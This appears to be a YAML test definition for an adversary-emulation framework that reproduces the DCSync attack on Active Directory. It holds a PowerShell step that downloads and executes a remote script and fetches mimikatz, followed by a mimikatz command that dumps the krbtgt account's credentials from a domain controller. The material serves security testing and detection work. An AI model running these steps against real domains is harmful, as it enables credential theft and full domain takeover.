api_version: "2.0"
name: DCSync (Active Directory)
description: |
    Active Directory attack allowing retrieval of account information without accessing memory or retrieving the NTDS database.
    Works against a remote Windows Domain Controller using the replication protocol.
    Privileges required: domain admin or domain controller account (by default), or any other account with required rights.
    [Reference](https://adsecurity.org/?p=1729)
args:
    - name: domain
      type: string
      default: '%userdnsdomain%'
    - name: user
      type: string
      default: krbtgt
    - name: mimikatz_path
      type: path
      default: '%tmp%\mimikatz\x64\mimikatz.exe'
uuid: 129efd28-8497-4c87-a1b0-73b9a870ca3e
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1003: OS Credential Dumping'
    subtechniques:
        - 'T1003.006: DCSync'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})
      inline: "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n}}\n"
      executor: powershell
    - name: dcsync-(active-directory)
      inline: |
        {{.Args.mimikatz_path}} "lsadump::dcsync /domain:{{.Args.domain}} /user:{{.Args.user}}@{{.Args.domain}}" "exit"
      executor: command_prompt
      cleanup:
        inline: ""
        executor: command_prompt
